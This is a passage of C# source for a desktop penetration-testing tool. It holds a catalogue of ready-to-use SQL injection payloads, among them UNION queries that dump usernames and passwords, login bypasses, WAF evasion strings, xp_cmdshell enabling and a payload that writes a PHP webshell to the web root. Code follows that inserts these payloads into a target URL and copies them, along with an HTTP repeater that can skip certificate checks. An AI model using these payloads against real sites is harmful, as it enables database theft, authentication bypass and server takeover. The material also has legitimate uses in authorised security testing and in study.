        new() { Name = "Inline comment /**/",             Cat = "classic", Payload = "' OR '1'='1'/**/" },
        new() { Name = "Tautology with AND",              Cat = "classic", Payload = "' AND '1'='1" },
        new() { Name = "NULL injection",                  Cat = "classic", Payload = "' OR 1=1--" },
        new() { Name = "Integer probe",                   Cat = "classic", Payload = "1; SELECT 1" },
        new() { Name = "Backtick tautology (MySQL)",      Cat = "classic", Payload = "' OR `1`=`1`--" },

        // ── UNION-based ──────────────────────────────────────────────────
        new() { Name = "UNION 1-col probe",               Cat = "union",   Payload = "' UNION SELECT NULL--" },
        new() { Name = "UNION 2-col probe",               Cat = "union",   Payload = "' UNION SELECT NULL,NULL--" },
        new() { Name = "UNION 3-col probe",               Cat = "union",   Payload = "' UNION SELECT NULL,NULL,NULL--" },
        new() { Name = "UNION version (MySQL)",           Cat = "union",   Payload = "' UNION SELECT NULL,@@version--" },
        new() { Name = "UNION version (3-col)",           Cat = "union",   Payload = "' UNION SELECT NULL,@@version,NULL--" },
        new() { Name = "UNION current DB (MySQL)",        Cat = "union",   Payload = "' UNION SELECT NULL,database()--" },
        new() { Name = "UNION current user",              Cat = "union",   Payload = "' UNION SELECT NULL,user()--" },
        new() { Name = "UNION table enum (MySQL)",        Cat = "union",   Payload = "' UNION SELECT NULL,table_name FROM information_schema.tables--" },
        new() { Name = "UNION column enum",               Cat = "union",   Payload = "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--" },
        new() { Name = "UNION dump creds (MySQL)",        Cat = "union",   Payload = "' UNION SELECT NULL,concat(username,0x3a,password) FROM users--" },
        new() { Name = "UNION table enum (MSSQL)",        Cat = "union",   Payload = "' UNION SELECT NULL,name FROM sys.tables--" },
        new() { Name = "UNION table enum (Oracle)",       Cat = "union",   Payload = "' UNION SELECT NULL,table_name FROM all_tables--" },
        new() { Name = "UNION load_file /etc/passwd",     Cat = "union",   Payload = "' UNION SELECT NULL,load_file('/etc/passwd')--" },
        new() { Name = "UNION INTO OUTFILE webshell",     Cat = "union",   Payload = "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--" },

        // ── Time-Based Blind ─────────────────────────────────────────────
        new() { Name = "SLEEP 5s (MySQL)",                Cat = "time",    Payload = "' AND SLEEP(5)--" },
        new() { Name = "SLEEP conditional (MySQL)",       Cat = "time",    Payload = "' AND IF(1=1,SLEEP(5),0)--" },
        new() { Name = "SLEEP version probe (MySQL)",     Cat = "time",    Payload = "' AND IF(substring(version(),1,1)='5',SLEEP(5),0)--" },
        new() { Name = "WAITFOR 5s (MSSQL)",              Cat = "time",    Payload = "'; WAITFOR DELAY '0:0:5'--" },
        new() { Name = "WAITFOR conditional (MSSQL)",     Cat = "time",    Payload = "'; IF (1=1) WAITFOR DELAY '0:0:5'--" },
        new() { Name = "pg_sleep 5s (PostgreSQL)",        Cat = "time",    Payload = "'; SELECT pg_sleep(5)--" },
        new() { Name = "pg_sleep conditional (PgSQL)",    Cat = "time",    Payload = "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--" },
        new() { Name = "DBMS_PIPE 5s (Oracle)",           Cat = "time",    Payload = "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--" },
        new() { Name = "randomblob delay (SQLite)",       Cat = "time",    Payload = "' AND 1=1 AND randomblob(100000000)--" },
        new() { Name = "BENCHMARK delay (MySQL)",         Cat = "time",    Payload = "' AND BENCHMARK(5000000,MD5(1))--" },

        // ── Boolean Blind ────────────────────────────────────────────────
        new() { Name = "True condition probe",            Cat = "bool",    Payload = "' AND 1=1--" },
        new() { Name = "False condition probe",           Cat = "bool",    Payload = "' AND 1=2--" },
        new() { Name = "Substring char probe",            Cat = "bool",    Payload = "' AND substring(username,1,1)='a'--" },
        new() { Name = "ASCII char probe",                Cat = "bool",    Payload = "' AND ASCII(substring(username,1,1))>64--" },
        new() { Name = "Version probe (MySQL)",           Cat = "bool",    Payload = "' AND substring(version(),1,1)='5'--" },
        new() { Name = "Version probe (MSSQL)",           Cat = "bool",    Payload = "' AND substring(@@version,1,1)='M'--" },
        new() { Name = "Table exists probe",              Cat = "bool",    Payload = "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--" },
        new() { Name = "Column length probe",             Cat = "bool",    Payload = "' AND LENGTH(password)>7--" },
        new() { Name = "LIKE prefix probe",               Cat = "bool",    Payload = "' AND username LIKE 'ad%'--" },

        // ── Error-Based ──────────────────────────────────────────────────
        new() { Name = "extractvalue (MySQL)",            Cat = "error",   Payload = "' AND extractvalue(1,concat(0x7e,version()))--" },
        new() { Name = "updatexml (MySQL)",               Cat = "error",   Payload = "' AND updatexml(1,concat(0x7e,database()),1)--" },
        new() { Name = "floor rand group-by (MySQL)",     Cat = "error",   Payload = "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)--" },
        new() { Name = "CONVERT int error (MSSQL)",       Cat = "error",   Payload = "' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--" },
        new() { Name = "CAST error (MSSQL)",              Cat = "error",   Payload = "' AND 1=CAST((SELECT TOP 1 name FROM sys.tables) AS int)--" },
        new() { Name = "ctxsys.drithsx.sn (Oracle)",      Cat = "error",   Payload = "' AND 1=ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))--" },
        new() { Name = "XMLType error (Oracle)",          Cat = "error",   Payload = "' AND 1=XMLType('<x/>'||(SELECT user FROM dual)||'</x>')--" },

        // ── Stacked Queries ──────────────────────────────────────────────
        new() { Name = "Stacked SELECT probe",            Cat = "stacked", Payload = "'; SELECT 1--" },
        new() { Name = "Stacked version (MSSQL)",         Cat = "stacked", Payload = "'; SELECT @@version--" },
        new() { Name = "xp_cmdshell exec (MSSQL)",        Cat = "stacked", Payload = "'; EXEC xp_cmdshell('{CMD}')--" },
        new() { Name = "Enable xp_cmdshell (MSSQL)",      Cat = "stacked", Payload = "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--" },
        new() { Name = "pg_read_file (PostgreSQL)",       Cat = "stacked", Payload = "'; SELECT pg_read_file('/etc/passwd',0,1000)--" },
        new() { Name = "COPY to file (PostgreSQL)",       Cat = "stacked", Payload = "'; COPY (SELECT 'test') TO '/tmp/sqli_probe.txt'--" },
        new() { Name = "Stacked INSERT probe",            Cat = "stacked", Payload = "'; INSERT INTO users(username,password) VALUES('sqlitest','sqlitest')--" },

        // ── Auth Bypass ──────────────────────────────────────────────────
        new() { Name = "admin -- (single quote)",         Cat = "auth",    Payload = "admin'--" },
        new() { Name = "admin -- (double quote)",         Cat = "auth",    Payload = "admin\"--" },
        new() { Name = "admin'# bypass",                  Cat = "auth",    Payload = "admin'#" },
        new() { Name = "OR 1=1 bypass",                   Cat = "auth",    Payload = "' OR 1=1--" },
        new() { Name = "OR 1=1 with wildcard password",   Cat = "auth",    Payload = "' OR '1'='1' AND password LIKE '%'--" },
        new() { Name = "Admin anything password",         Cat = "auth",    Payload = "admin' AND 1=1--" },
        new() { Name = "Null byte bypass",                Cat = "auth",    Payload = "admin'%00" },
        new() { Name = "Unicode apostrophe bypass",       Cat = "auth",    Payload = "ʼ OR 1=1--" },

        // ── WAF Bypass ───────────────────────────────────────────────────
        new() { Name = "Inline comment obfuscation",      Cat = "waf",     Payload = "' /*!OR*/ '1'='1'--" },
        new() { Name = "URL-encoded quote",               Cat = "waf",     Payload = "%27 OR %271%27=%271" },
        new() { Name = "Double URL-encoded",              Cat = "waf",     Payload = "%2527 OR %25271%2527=%25271" },
        new() { Name = "Case variation",                  Cat = "waf",     Payload = "' oR '1'='1'--" },
        new() { Name = "Hex tautology (MySQL)",           Cat = "waf",     Payload = "' OR 0x31=0x31--" },
        new() { Name = "CHAR() function bypass",          Cat = "waf",     Payload = "' OR CHAR(49)=CHAR(49)--" },
        new() { Name = "Tab instead of space",            Cat = "waf",     Payload = "'\tOR\t'1'='1'--" },
        new() { Name = "Scientific notation",             Cat = "waf",     Payload = "' OR 1e0=1e0--" },
        new() { Name = "Nested comment (MySQL)",          Cat = "waf",     Payload = "' OR/**/1=1--" },
    };

    private void OnSqliFilterChanged(object sender, TextChangedEventArgs e) => RefreshSqliPayloads();

    private async void OnCopySqliPayload(object? sender, RoutedEventArgs e)
    {
        // 1. Ensure the final payload textbox exists and has content
        if (SqliFinalPayload != null && !string.IsNullOrEmpty(SqliFinalPayload.Text))
        {
            // 2. Get the clipboard from the TopLevel (the Window itself)
            var clipboard = TopLevel.GetTopLevel(this)?.Clipboard;

            if (clipboard != null)
            {
                // 3. Set the text asynchronously
                await clipboard.SetTextAsync(SqliFinalPayload.Text);
            }
        }
    }

    private void OnSqliUrlOrPayloadChanged(object sender, TextChangedEventArgs e)
    {
        // Logic to construct the payload
        string baseUrl = SqliTargetUrl.Text ?? "";
        //string param   = SqliParamInput.Text ?? "";
        //string cmd     = SqliCmdInput.Text ?? "";
        
        // Replace placeholders in your selected template with the inputs
        // e.g., result = _activeTemplate.Replace("{URL}", baseUrl)...
        SqliFinalPayload.Text = ConstructPayload(baseUrl, _selectedPayloadTemplate);
    }

    private void OnInjectMarker(object? sender, RoutedEventArgs e)
    {
        // Inserts '@@' at the cursor position
        int selectionStart = SqliTargetUrl.SelectionStart;
        string text = SqliTargetUrl.Text ?? "";
        SqliTargetUrl.Text = text.Insert(selectionStart, "@@");
        SqliTargetUrl.SelectionStart = selectionStart + 2; // Place cursor after '@@'
    }

    private string ConstructPayload(string baseUrl, string payload)
    {
        bool useEncoding = EnableUrlEncoding?.IsChecked ?? true;
        string processedPayload = useEncoding ? Uri.EscapeDataString(payload) : payload;

        if (baseUrl.Contains("@@"))
        {
            return baseUrl.Replace("@@", processedPayload);
        }
        return baseUrl.EndsWith("/") ? $"{baseUrl}{processedPayload}" : $"{baseUrl}{processedPayload}";
    }

    private void OnSqliPayloadSelected(object? sender, SelectionChangedEventArgs e)
    {
        if (SqliPayloadList.SelectedItem is SqliPayloadVm selected)
        {
            // Update the global state
            _selectedPayloadTemplate = selected.Payload;
            UpdateFinalPayload();
        }
    }

    // Checkbox handler
    private void OnConfigChanged(object? sender, RoutedEventArgs e)
    {
        UpdateFinalPayload();
    }

    private void UpdateFinalPayload()
    {
        if (SqliTargetUrl == null || SqliFinalPayload == null) return;

        string baseUrl = SqliTargetUrl.Text ?? "";
        // Pass the payload template currently selected
        SqliFinalPayload.Text = ConstructPayload(baseUrl, _selectedPayloadTemplate);
    }

    private void OnSqliCatFilter(object sender, RoutedEventArgs e)
    {
        if (sender is not Button btn || btn.Tag is not string cat) return;
        _currentSqliFilter = cat;

        var allFilterBtns = new[] {
            SqliBtnAll, SqliBtnClassic, SqliBtnUnion, SqliBtnTime,
            SqliBtnBool, SqliBtnError, SqliBtnStacked, SqliBtnAuth, SqliBtnWaf
        };
        foreach (var b in allFilterBtns)
        {
            if (b == null) continue;
            b.Background  = Brushes.Transparent;
            b.BorderBrush = new SolidColorBrush(Color.Parse("#30363d"));
            b.Foreground  = new SolidColorBrush(Color.Parse("#8b949e"));
        }
        btn.Background  = new SolidColorBrush(Color.Parse("#21262d"));
        btn.BorderBrush = new SolidColorBrush(Color.Parse("#7c6bff"));
        btn.Foreground  = new SolidColorBrush(Color.Parse("#7c6bff"));

        RefreshSqliPayloads();
    }

    private void RefreshSqliPayloads()
    {
        if (SqliPayloadList == null) return;

        string search = (SqliSearchBox?.Text ?? "").Trim().ToLowerInvariant();

        var list = _sqliBlueprints
            .Where(p => _currentSqliFilter == "all" || p.Cat == _currentSqliFilter)
            .Where(p => string.IsNullOrEmpty(search) ||
                        p.Name.Contains(search, StringComparison.OrdinalIgnoreCase) ||
                        p.Payload.Contains(search, StringComparison.OrdinalIgnoreCase) ||
                        p.Cat.Contains(search, StringComparison.OrdinalIgnoreCase))
            .Select(p =>
            {
                // We just use the template as-is or inject the URL if needed
                string baseUrl = (SqliTargetUrl?.Text ?? "").Trim().TrimEnd('/');
                string finalPayload = ConstructPayload(baseUrl, p.Payload);
                
                // Construct the final string based only on your template's requirements
                // If your templates just need the URL injected:
                //string finalPayload = p.Payload.Replace("{URL}", baseUrl);
                
                return new SqliPayloadVm
                {
                    Name     = p.Name,
                    Category = p.Cat.ToUpper(),
                    Payload  = p.Payload, 
                    FullUrl  = finalPayload,
                };
            })
            .ToList();

        SqliPayloadList.ItemsSource = list;
    }

    private async void OnSqliCopyPayload(object sender, RoutedEventArgs e)
    {
        if (sender is not Button btn || btn.Tag is not string payload) return;
        await TrySetClipboard(payload);
        await FlashButton(btn, "Copied!");
    }

    private async void OnSqliCopyUrl(object? sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is SqliPayloadVm vm)
        {
            // Recalculate using current URL and the specific payload from this row
            string baseUrl = SqliTargetUrl.Text ?? "";
            string finalUrl = ConstructPayload(baseUrl, vm.Payload);
            
            var clipboard = TopLevel.GetTopLevel(this)?.Clipboard;
            if (clipboard != null) await clipboard.SetTextAsync(finalUrl);
        }
    }

    private async void OnCopyAllPayloads(object? sender, RoutedEventArgs e)
    {
        // 1. Get the current list from the ListBox
        if (SqliPayloadList.ItemsSource is System.Collections.IEnumerable items)
        {
            string baseUrl = SqliTargetUrl.Text ?? "";
            StringBuilder sb = new StringBuilder();

            // 2. Iterate through the items and build the string
            foreach (var item in items)
            {
                if (item is SqliPayloadVm vm)
                {
                    // Re-calculate the full URL based on the current settings
                    string fullUrl = ConstructPayload(baseUrl, vm.Payload);
                    sb.AppendLine(fullUrl);
                }
            }

            // 3. Copy to clipboard
            string allPayloads = sb.ToString();
            if (!string.IsNullOrEmpty(allPayloads))
            {
                var clipboard = TopLevel.GetTopLevel(this)?.Clipboard;
                if (clipboard != null) await clipboard.SetTextAsync(allPayloads);
            }
        }
    }

    private static async Task FlashButton(Button btn, string flashText)
    {
        string orig = btn.Content as string ?? "";
        btn.Content = flashText;
        await Task.Delay(1400);
        btn.Content = orig;
    }

    // ══════════════════════════════════════════════════════════════════════
    // HTTP Repeater
    // ══════════════════════════════════════════════════════════════════════

    private void OnRespTabClick(object sender, RoutedEventArgs e)
    {
        if (sender is not Button btn || btn.Tag is not string tab) return;
        _repeaterRespTab = tab;
        ShowRepeaterResponse();
    }

    private void OnRepeaterKeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
        {
            e.Handled = true;
            OnRepeaterSend(sender, new RoutedEventArgs());
        }
    }

    // Send button — uses the URL box only, ignores raw request box
    private async void OnRepeaterSend(object sender, RoutedEventArgs e)
    {
        string url = RepeaterUrl?.Text?.Trim() ?? "";
        if (string.IsNullOrEmpty(url)) return;
        if (!url.StartsWith("http", StringComparison.OrdinalIgnoreCase)) url = "https://" + url;

        string method = (RepeaterMethod?.SelectedItem as ComboBoxItem)?.Content as string ?? "GET";
        await SendRequest(url, method, "");
    }

    // Send with Headers button — uses the raw request box, builds URL from Host header + path
    private async void OnRepeaterSendWithHeaders(object sender, RoutedEventArgs e)
    {
        string rawRequest = RepeaterRawRequest?.Text?.Trim() ?? "";
        if (string.IsNullOrEmpty(rawRequest)) return;

        var lines = rawRequest.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

        // Parse request line: "GET /path HTTP/1.1"
        var requestLineParts = lines[0].Split(' ');
        string method = requestLineParts.Length >= 1 ? requestLineParts[0] : "GET";
        string path   = requestLineParts.Length >= 2 ? requestLineParts[1] : "/";

        // Find Host header
        string host = "";
        foreach (var line in lines.Skip(1))
        {
            if (line.StartsWith("Host:", StringComparison.OrdinalIgnoreCase))
            {
                host = line.Substring(5).Trim();
                break;
            }
        }

        if (string.IsNullOrEmpty(host))
        {
            if (RepeaterRespBox != null) RepeaterRespBox.Text = "[Error] No Host header found in request box.";
            return;
        }

        string url = $"https://{host}{path}";
        await SendRequest(url, method, rawRequest);
    }

    // Shared send logic
    private async Task SendRequest(string url, string method, string rawRequest)
    {
        bool hasRaw  = !string.IsNullOrEmpty(rawRequest);
        bool follow  = RepeaterFollowRedirects?.IsChecked ?? true;
        bool skipSsl = RepeaterSkipSslVerify?.IsChecked ?? true;
        _repeaterLastUrl = url;

        // Split raw request into headers and body sections
        string headerSection = rawRequest;
        string body = "";
        int separatorIndex = rawRequest.IndexOf("\r\n\r\n");
        if (separatorIndex != -1)
        {
            headerSection = rawRequest.Substring(0, separatorIndex);
            body          = rawRequest.Substring(separatorIndex + 4);
        }

        if (RepeaterSendingHint != null) RepeaterSendingHint.Text = "Sending…";
        if (RepeaterStatusTxt   != null) RepeaterStatusTxt.Text   = "…";
        if (RepeaterTimingTxt   != null) RepeaterTimingTxt.Text   = "";
        if (RepeaterSizeTxt     != null) RepeaterSizeTxt.Text     = "";

        try
        {
            var handler = new HttpClientHandler
            {
                AllowAutoRedirect = follow,
                ServerCertificateCustomValidationCallback = skipSsl ? (_, _, _, _) => true : null,
            };

            using var client  = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };
            var request       = new HttpRequestMessage(new HttpMethod(method), url);

            if (hasRaw)
            {
                // Skip the request line (line 0), parse the rest as headers
                foreach (var line in headerSection.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries).Skip(1))
                {
                    int colon = line.IndexOf(':');
                    if (colon < 1) continue;
                    string hName = line[..colon].Trim();
                    string hVal  = line[(colon + 1)..].Trim();
                    if (!request.Headers.TryAddWithoutValidation(hName, hVal))
                        request.Content?.Headers.TryAddWithoutValidation(hName, hVal);
                }
            }

            if (!string.IsNullOrEmpty(body) && method is not ("GET" or "HEAD"))
                request.Content = new StringContent(body, Encoding.UTF8, "application/octet-stream");

            var sw = Stopwatch.StartNew();
            using var response = await client.SendAsync(request, HttpCompletionOption.ResponseContentRead);
            sw.Stop();

            int    status = (int)response.StatusCode;
            string reason = response.ReasonPhrase ?? "";

            var hdrSb = new StringBuilder();
            hdrSb.AppendLine($"HTTP/1.1 {status} {reason}");
            foreach (var h in response.Headers)
                foreach (var v in h.Value)
                    hdrSb.AppendLine($"{h.Key}: {v}");
            if (response.Content?.Headers != null)
                foreach (var h in response.Content.Headers)
                    foreach (var v in h.Value)
                        hdrSb.AppendLine($"{h.Key}: {v}");

            string respBody      = response.Content != null ? await response.Content.ReadAsStringAsync() : "";
            _repeaterRespHeaders = hdrSb.ToString().TrimEnd();
            _repeaterRespBody    = respBody;

            await Avalonia.Threading.Dispatcher.UIThread.InvokeAsync(() =>
            {
                if (RepeaterSendingHint != null) RepeaterSendingHint.Text = "";
                RepeaterStatusTxt.Text  = $"{status} {reason}";
                RepeaterTimingTxt.Text  = $"{sw.ElapsedMilliseconds} ms";
                RepeaterSizeTxt.Text    = FormatBytes(Encoding.UTF8.GetByteCount(respBody));
                ShowRepeaterResponse();
            });
        }
        catch (Exception ex)
        {
            _repeaterRespHeaders = "";
            _repeaterRespBody    = $"[Request failed]\n{ex.GetType().Name}: {ex.Message}";
            await Avalonia.Threading.Dispatcher.UIThread.InvokeAsync(() =>
            {
                if (RepeaterSendingHint != null) RepeaterSendingHint.Text = "";
                RepeaterStatusTxt.Text = "Error";
                ShowRepeaterResponse();
            });
        }
    }

    // Load Headers button — takes response headers, cleans them, builds a new request in the raw box
    private void OnLoadResponseHeadersToRequest(object sender, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(_repeaterRespHeaders)) return;

        var lines = _repeaterRespHeaders.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
        var cleanHeaders = new List<string>();

        foreach (var line in lines)
        {
            // Strip response-only headers that are invalid in requests
            if (line.StartsWith("HTTP/",             StringComparison.OrdinalIgnoreCase)) continue;
            if (line.StartsWith("Server:",           StringComparison.OrdinalIgnoreCase)) continue;
            if (line.StartsWith("Date:",             StringComparison.OrdinalIgnoreCase)) continue;
            if (line.StartsWith("Transfer-Encoding:",StringComparison.OrdinalIgnoreCase)) continue;
            if (line.StartsWith("Content-Length:",   StringComparison.OrdinalIgnoreCase)) continue;
            if (line.StartsWith("Host:",             StringComparison.OrdinalIgnoreCase)) continue;
            if (line.StartsWith("Set-Cookie:",       StringComparison.OrdinalIgnoreCase)) continue;
            if (line.StartsWith("Alt-Svc:",          StringComparison.OrdinalIgnoreCase)) continue;
            if (string.IsNullOrWhiteSpace(line)) continue;

            cleanHeaders.Add(line);
        }

        // Build URL from the URL box to extract host and path
        string path = "/";
        string host = "";
        string url  = RepeaterUrl?.Text?.Trim() ?? "";
        if (!string.IsNullOrEmpty(url))
        {
            if (!url.StartsWith("http", StringComparison.OrdinalIgnoreCase)) url = "https://" + url;
            try
            {
                var uri = new Uri(url);
                host    = uri.Host;
                path    = uri.PathAndQuery;
            }
            catch { }
        }

        // Insert Host as the first header
        if (!string.IsNullOrEmpty(host))
            cleanHeaders.Insert(0, $"Host: {host}");

        string method = (RepeaterMethod?.SelectedItem as ComboBoxItem)?.Content as string ?? "GET";
        RepeaterRawRequest.Text = $"{method} {path} HTTP/1.1\r\n" + string.Join("\r\n", cleanHeaders);
    }

    private void ShowRepeaterResponse()
    {
        if (RepeaterRespBox == null) return;
        RepeaterRespBox.Text = _repeaterRespTab switch
        {
            "body" => string.IsNullOrEmpty(_repeaterRespBody)    ? "(empty body)"     : _repeaterRespBody,
            "full" => string.IsNullOrEmpty(_repeaterRespHeaders) ? "(no response yet)": _repeaterRespHeaders + "\r\n\r\n" + _repeaterRespBody,
            _      => string.IsNullOrEmpty(_repeaterRespHeaders) ? "(no response yet)": _repeaterRespHeaders,
        };
    }

    private static string FormatBytes(long b) => b switch
    {
        < 1024        => $"{b} B",
        < 1024 * 1024 => $"{b / 1024.0:F1} KB",
        _             => $"{b / (1024.0 * 1024):F1} MB",
    };

    private void OnRepeaterClear(object sender, RoutedEventArgs e)
    {
        RepeaterUrl!.Text      = "";
        RepeaterRawRequest!.Text = "";
        RepeaterRespBox!.Text  = "Send a request to see the response here.";
        RepeaterStatusTxt!.Text      = "—";
        RepeaterStatusTxt!.Foreground = new SolidColorBrush(Color.Parse("#6e7681"));
        RepeaterTimingTxt!.Text = "";
        RepeaterSizeTxt!.Text   = "";
        _repeaterRespHeaders = "";
        _repeaterRespBody    = "";
        _repeaterLastUrl     = "";
    }

    private void OnRepeaterOpenBrowser(object sender, RoutedEventArgs e)
    {
        string url = string.IsNullOrEmpty(_repeaterLastUrl) ? (RepeaterUrl?.Text?.Trim() ?? "") : _repeaterLastUrl;
        //if (RepeaterRespBox != null) RepeaterRespBox.Text = $"Opening: '{url}'";
        if (!string.IsNullOrEmpty(url)) OpenUrl(url);
    }

    private async void OnRepeaterCopyResp(object sender, RoutedEventArgs e)
    {
        string text = RepeaterRespBox?.Text ?? "";
        if (!string.IsNullOrEmpty(text)) await TrySetClipboard(text);
    }

    private void OnLaunchExternalUrl(object? sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is string url) OpenUrl(url);
    }

    private static void OpenUrl(string url)
    {
        try
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                Process.Start(new ProcessStartInfo(url.Replace("&", "^&")) { UseShellExecute = true });
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                Process.Start("xdg-open", url);
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                Process.Start("open", url);
        }
        catch { }
    }
}
// ── Supporting model classes ───────────────────────────────────────────────

public class ShellBlueprint
{
    public string Name     { get; set; } = "";
    public string Category { get; set; } = "";
    public string Template { get; set; } = "";
}

public class ShellPayloadInstance
{
    public string Name           { get; set; } = "";
    public string Category       { get; set; } = "";
    public string RawCommand     { get; set; } = "";
    public string B64Command     { get; set; } = "";
    public string UrlCommand     { get; set; } = "";
    public string DisplayCommand { get; set; } = "";
}

public class OsintLaunchBlueprints
{
    public string Name      { get; set; } = "";
    public string TargetUrl { get; set; } = "";
}

public class ExploitEngine
{
    public string Name        { get; set; } = "";
    public string Description { get; set; } = "";
    public string TargetUrl   { get; set; } = "";
}

public class VaultBackup
{
    public List<CategoryItem> Cats { get; set; } = new();
}

public class SqliBlueprint
{
    public string Name    { get; set; } = "";
    public string Cat     { get; set; } = "";
    public string Template { get; set; } = "";
    public string Payload { get; set; } = "";
}

public class SqliPayloadVm
{
    public string Name     { get; set; } = "";
    public string Category { get; set; } = "";
    public string Payload  { get; set; } = "";
    public string FullUrl  { get; set; } = "";
}